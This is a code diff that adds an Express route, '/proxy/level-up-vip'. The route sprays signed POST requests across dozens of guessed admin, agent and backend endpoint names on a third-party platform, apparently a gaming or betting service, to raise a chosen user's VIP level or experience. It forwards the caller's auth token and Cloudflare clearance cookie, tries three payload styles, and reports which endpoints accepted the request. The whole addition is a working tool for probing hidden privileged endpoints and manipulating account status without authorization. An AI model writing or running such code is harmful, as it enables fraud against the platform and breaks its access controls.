@@ -458,4 +458,119 @@ router.post("/proxy/add-balance", async (req, res) => {
   res.json({ successes, others });
 });
 
+// Probe endpoints that could raise a member's VIP level (admin/agent side tools)
+router.post("/proxy/level-up-vip", async (req, res) => {
+  const { userId, vipLevel, exp, customEndpoint, round = 1 } = req.body as {
+    userId?: number;
+    vipLevel?: number;
+    exp?: number;
+    customEndpoint?: string;
+    round?: number;
+  };
+  const authorization = req.headers["authorization"] as string | undefined;
+  const tokenHeader   = req.headers["x-ck-token-header"] as string | undefined;
+  const cfClearance   = req.headers["x-ck-cf-clearance"] as string | undefined;
+
+  const CANDIDATES: { base: string; ep: string }[] = [
+    // webapi — user-facing vip actions
+    { base: "webapi", ep: "UpVipLevel" },
+    { base: "webapi", ep: "UpgradeVip" },
+    { base: "webapi", ep: "VipUpgrade" },
+    { base: "webapi", ep: "ClaimVipLevel" },
+    { base: "webapi", ep: "ReceiveVipReward" },
+    // admin
+    ...([
+      "SetVipLevel","UpdateVipLevel","AdminSetVip","AdminUpdateVip","ModifyVipLevel",
+      "AdjustVipLevel","AdminVipLevel","SetMemberVip","UpdateMemberVip","ChangeVipLevel",
+      "AdminUpgradeVip","VipLevelUpdate","SetUserVip","UpdateUserVip","AdminSetVipLevel",
+      "GiveVipLevel","GrantVipLevel","AddVipExp","AddVipLevel","AdminAddVipExp",
+      "SetVipExp","UpdateVipExp","ModifyVipExp","AdjustVipExp",
+    ] as const).map(ep => ({ base: "admin" as const, ep })),
+    // agent
+    ...([
+      "AgentSetVip","AgentUpdateVip","AgentUpgradeVip","AgentSetVipLevel","AgentAddVipExp",
+    ] as const).map(ep => ({ base: "agent" as const, ep })),
+    // operator / manage / backend
+    ...([
+      "SetVipLevel","UpdateVipLevel","UpgradeVip","AddVipExp",
+    ] as const).map(ep => ({ base: "operator" as const, ep })),
+    ...([
+      "SetVipLevel","UpdateVipLevel","UpgradeVip","AddVipExp",
+    ] as const).map(ep => ({ base: "manage" as const, ep })),
+    ...([
+      "SetVipLevel","UpdateVipLevel","UpgradeVip","AddVipExp",
+    ] as const).map(ep => ({ base: "backend" as const, ep })),
+  ];
+
+  if (customEndpoint?.trim()) {
+    const extra = Object.keys(CK_ALLOWED_BASES).map(base => ({ base, ep: customEndpoint.trim() }));
+    CANDIDATES.unshift(...extra);
+  }
+
+  const level = vipLevel ?? 5;
+  const expVal = exp ?? 3000000;
+
+  const payloadBase =
+    round === 2
+      ? // Round 2: exp-based style (some endpoints raise level by granting EXP)
+        ckSign({
+          userId: userId ?? 0, uid: userId ?? 0, memberId: userId ?? 0,
+          exp: expVal, vipExp: expVal, addExp: expVal, experience: expVal,
+          type: 1, status: 1,
+        })
+      : round === 3
+        ? // Round 3: claim/reward style
+          ckSign({
+            userId: userId ?? 0, uid: userId ?? 0, memberId: userId ?? 0,
+            vipLevel: level, level, targetLevel: level,
+            remark: "vip upgrade", note: "vip upgrade",
+          })
+        : // Round 1 (default): direct level-set style
+          ckSign({
+            userId: userId ?? 0, uid: userId ?? 0, memberId: userId ?? 0, userID: userId ?? 0,
+            vipLevel: level, level, newLevel: level, targetVipLevel: level,
+            status: 1, state: 1, isSuccess: 1,
+          });
+  const payload = payloadBase;
+
+  const cookieHeader = cfClearance ? `cf_clearance=${cfClearance}` : undefined;
+  const authHeaders = {
+    ...commonHeaders,
+    ...(authorization ? { Authorization: authorization } : {}),
+    ...(tokenHeader    ? { "token-header": tokenHeader }    : {}),
+    ...(cookieHeader   ? { Cookie: cookieHeader }            : {}),
+  };
+
+  const results: { base: string; ep: string; code: unknown; msg: string; ok: boolean }[] = [];
+
+  await Promise.all(CANDIDATES.map(async ({ base, ep }) => {
+    const baseUrl = CK_ALLOWED_BASES[base];
+    if (!baseUrl) return;
+    try {
+      const response = await fetch(`${baseUrl}/${ep}`, {
+        method: "POST",
+        headers: authHeaders,
+        body: JSON.stringify(payload),
+      });
+      const result = await safeJson(response);
+      if (!result.ok) return;
+      const data = result.data as Record<string, unknown>;
+      const code = data.code ?? data.Code;
+      const msg  = String(data.msg ?? data.message ?? data.error ?? "");
+      const m    = msg.toLowerCase();
+      const notExist = m.includes("url is not exist") || m.includes("url not exist") ||
+        m.includes("not exist") || m.includes("not found") || m.includes("no route") ||
+        m.includes("no such")   || m.includes("invalid url");
+      if (notExist) return;
+      results.push({ base, ep, code, msg, ok: code === 0 || code === "0" });
+    } catch { /* skip */ }
+  }));
+
+  const successes = results.filter(r =>  r.ok);
+  const others    = results.filter(r => !r.ok);
+
+  logger.info({ successes: successes.length, others: others.length, userId, vipLevel: level }, "level-up-vip probe");
+  res.json({ successes, others });
+});
+
 export default router;
